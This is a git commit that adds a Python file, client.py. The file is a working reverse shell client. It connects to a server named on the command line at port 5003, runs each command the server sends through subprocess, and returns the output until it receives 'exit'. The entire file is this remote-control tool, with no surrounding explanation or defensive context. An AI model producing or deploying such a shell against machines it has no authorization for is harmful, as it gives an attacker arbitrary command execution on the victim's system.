51f908dd5735ecd3f72cd588ad2a1bad816f19c1
Fa1c0n <33335488+fa1c0n-king@users.noreply.github.com>
2020-04-11 13:58:06 +0700

    Create client.py

---
+++ client.py
@@ -0,0 +1,29 @@
+import socket
+import subprocess
+import sys
+
+SERVER_HOST = sys.argv[1]
+SERVER_PORT = 5003
+BUFFER_SIZE = 1024
+
+# create the socket object
+s = socket.socket()
+# connect to the server
+s.connect((SERVER_HOST, SERVER_PORT))
+
+# receive the greeting message
+message = s.recv(BUFFER_SIZE).decode()
+print("Server:", message)
+
+while True:
+    # receive the command from the server
+    command = s.recv(BUFFER_SIZE).decode()
+    if command.lower() == "exit":
+        # if the command is exit, just break out of the loop
+        break
+    # execute the command and retrieve the results
+    output = subprocess.getoutput(command)
+    # send the results back to the server
+    s.send(output.encode())
+# close client connection
+s.close()
